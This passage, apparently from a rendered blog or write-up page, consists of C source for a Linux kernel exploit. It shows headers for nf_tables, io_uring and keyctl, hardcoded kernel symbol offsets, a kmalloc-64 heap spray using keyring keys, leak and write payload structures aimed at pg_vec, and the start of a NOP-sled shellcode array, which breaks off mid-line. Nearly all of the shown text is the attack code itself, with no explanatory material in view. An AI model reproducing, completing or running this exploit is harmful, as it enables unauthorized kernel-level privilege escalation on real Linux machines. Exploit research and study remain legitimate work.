class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/io_uring.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netfilter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netfilter/nfnetlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netfilter/nf_tables.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernelpwn.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ID 1337</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_NAME <span class="meta-string">&quot;nameXXX&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEAK_SET_NAME <span class="meta-string">&quot;leakXXX&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_NAME <span class="meta-string">&quot;tableXX&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IO_RING_CTX_REF_FREE_OFFSET 0xc4235d        <span class="comment">// ?????????  ffffffff81c4235d t io_ring_ctx_ref_free</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IO_RSRC_NODE_REF_ZERO_OFFSET 0xc42517       <span class="comment">// ?????????  ffffffff81c42517 t io_rsrc_node_ref_zero</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// spray in kmalloc-64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_DESC_MAX_SIZE 40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_PAYLOAD_SIZE (32 + 1 - 24)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREFIX_BUF_LEN (16)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RCU_HEAD_LEN (16)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPRAY_KEY_CNT (150)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FREE_HOLE_BEGIN (100)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FREE_HOLE_STEP (10)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CORRUPT_SIZE (0x8000)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHYSMAP_MASK 0xffffffff00000000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC64_KEYLEN (64 - 8 - 12 - 16)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">leak_payload</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> prefix[PREFIX_BUF_LEN];</span><br><span class="line">    <span class="keyword">uint8_t</span> rcu_buf[RCU_HEAD_LEN];</span><br><span class="line">    <span class="keyword">uint16_t</span> len;</span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_payload</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> prefix[PREFIX_BUF_LEN];</span><br><span class="line">    <span class="keyword">char</span> *pg_vec;</span><br><span class="line">    <span class="keyword">char</span> *pg_vec2; <span class="comment">// in case shellcode is too long</span></span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int32_t</span> <span class="keyword">key_serial_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spray_keyring</span><span class="params">(<span class="keyword">key_serial_t</span> *id_buffer, <span class="keyword">uint32_t</span> spray_size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> key_desc[<span class="number">0x20</span>];</span><br><span class="line">    <span class="keyword">char</span> key_payload[KEY_PAYLOAD_SIZE + <span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; spray_size; i++) &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(key_desc, <span class="keyword">sizeof</span>(key_desc), <span class="string">&quot;spray_key_%d&quot;</span>, i);</span><br><span class="line">        <span class="built_in">memset</span>(key_payload, <span class="string">&#x27;A&#x27;</span>, KEY_PAYLOAD_SIZE);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++) &#123;</span><br><span class="line">            <span class="comment">// retry, after KEYCTL_REVOKE, the key is scheduled for garbage collection,</span></span><br><span class="line">            <span class="comment">//  so it is not freed immediately</span></span><br><span class="line">            id_buffer[i] = key_alloc(key_desc, key_payload, <span class="number">0x20</span>);</span><br><span class="line">            <span class="keyword">if</span> (id_buffer[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                usleep(<span class="number">100</span> * <span class="number">1000</span>); <span class="comment">// 100ms</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (id_buffer[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;add_key&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> shellcode[] = &#123;</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span 